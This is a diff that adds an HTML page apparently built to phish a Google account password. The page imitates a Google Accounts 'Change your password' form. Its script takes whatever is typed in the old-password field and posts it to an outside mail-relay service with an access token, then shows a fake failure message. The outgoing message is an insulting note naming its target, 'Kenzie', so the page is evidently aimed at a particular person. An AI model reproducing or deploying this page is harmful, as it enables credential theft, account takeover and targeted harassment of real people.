@@ -1,0 +1,193 @@
+<html>
+  <head>
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+  </head>
+  <body>
+    <div class="topbar">
+      <img width="100" src="https://ssl.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png">
+      <h1 class="toptitle">| Accounts</h1>
+    </div>
+    <div class="center">
+    <h1 id="title">Change your password</h1>
+    <input type="password" placeholder="Old password" id="pwd">
+    <p>Use a strong password, and never one<br>you've used for a seperate account</p>
+    <input type="password" placeholder="New password">
+    <p>Make sure you're typing your password correctly.<br>You wouldn't wanna get locked out</p>
+    <input type="password" placeholder="Confirm new password">
+    <div class="tooltip" id="tooltip">
+      <span class="tooltiptext" id="tooltiptext">Failure changing password, try again later</span>
+      <button onclick="next();">CHANGE PASSWORD</button>
+    </div>
+      <img class="gimg" src="https://ssl.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png">
+    </div>
+    <style>
+      body {
+        background-color: #fafafa;
+        padding: 0px;
+        margin: 0px;
+      }
+      * {
+        font-family: 'Roboto', sans-serif;
+      }
+      img {
+        margin: 0px;
+        display: inline-block;
+        vertical-align: middle;
+      }
+      h1 {
+        font-size: 20pt;
+        font-weight: 300;
+      }
+      .toptitle {
+        display: inline-block;
+        margin: 0px;
+        font-size: 16pt;
+        vertical-align: middle;
+        color: #555;
+      }
+      .tooltip .tooltiptext {
+        width: 200px;
+        background-color: #aa0000;
+        color: #fff;
+        text-align: center;
+        border-radius: 6px;
+        padding: 5px 0;
+        position: absolute;
+        z-index: 1;
+        transform: translate(-25px, -60%);
+        box-shadow: 0px 0px 20px #888888;
+        visibility: hidden;
+      }
+      .tooltip .tooltiptext::after {
+        content: " ";
+        position: absolute;
+        top: 100%; /* At the bottom of the tooltip */
+        left: 50%;
+        margin-left: -5px;
+        border-width: 5px;
+        border-style: solid;
+        border-color: #aa0000 transparent transparent transparent;
+        box-shadow: 0px 0px 20px #888888;
+        animation-duration: 0.5s;
+      }
+      .topbar {
+        padding: 15px;
+        margin: 0px;
+        background-color: white;
+        width: 100%;
+        border-bottom-color: #eee;
+        border-bottom-width: 1px;
+        border-bottom-style: solid;
+      }
+      .center {
+        margin: 0;
+        padding: 15px;
+        height: 400px;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        box-shadow: 0px 5px 4px #888888;
+        background-color: #ffffff;
+        width: 35%;
+
+      }
+      .gimg {
+        display: block;
+        margin: auto;
+        margin-top: 70px;
+      }
+      input {
+        border: none;
+        height: 30px;
+        width: 50%;
+        border-bottom-style: solid;
+        border-bottom-width: 1px;
+        border-bottom-color: #aaaaaa;
+        animation-name: unfocus;
+        animation-duration: 0.5s;
+      }
+      @media only screen and (max-device-width: 480px) {
+        input {
+          width: 100%;
+        }
+        .center {
+          width: 75%;
+        }
+        .gimg {
+          visibility: hidden;
+        }
+      }
+      input:focus {
+        outline: none;
+        animation-name: focus;
+        animation-duration: 0.5s;
+        border-bottom-color: #00aaff;
+      }
+      button {
+        border: none;
+        height: 40px;
+        background-color: #4285f4;
+        color: #fff;
+        margin-top: 10px;
+        cursor: pointer;
+        box-shadow: 0px 5px 4px #bbb;
+        border-radius: 5px;
+        width: 150px;
+      }
+      button:focus {
+        outline: none;
+      }
+      p {
+        text-align: left;
+        margin-bottom: 0px;
+        font-size: 10pt;
+        font-weight: 400;
+      }
+      @keyframes focus {
+        from {
+          border-bottom-color: #aaaaaa;
+        }
+        to {
+          border-bottom-color: #00aaff;
+        }
+      }
+      @keyframes unfocus {
+        from {
+          border-bottom-color: #00aaff;
+        }
+        to {
+          border-bottom-color: #aaaaaa;
+        }
+      }
+    </style>
+    <script>
+      var next = function() {
+        console.log('sup');
+        document.getElementById("tooltip").style.visibility = "visible";
+        document.getElementById("tooltiptext").style.visibility = "visible";
+				var pwd = document.getElementById("pwd").value;
+				var request = new XMLHttpRequest();
+				var text = "Kenzie is fucking stupid and her password is " + pwd
+				var requestdata = {
+					"access_token": "o7eo8hgbwzbiq8g0y369whl0",
+					"subject": "Kenzie is fucking stupid lmao",
+					"text": text
+				}
+				var params = toParams(requestdata);
+				request.open("POST", "https://postmail.invotes.com/send", true);
+        request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+        request.send(params);
+      };
+			function toParams(data_js) {
+        var form_data = [];
+        for ( var key in data_js ) {
+            form_data.push(encodeURIComponent(key) + "=" + encodeURIComponent(data_js[key]));
+        }
+        return form_data.join("&");
+    	}
+    </script>
+  </body>
+</html>
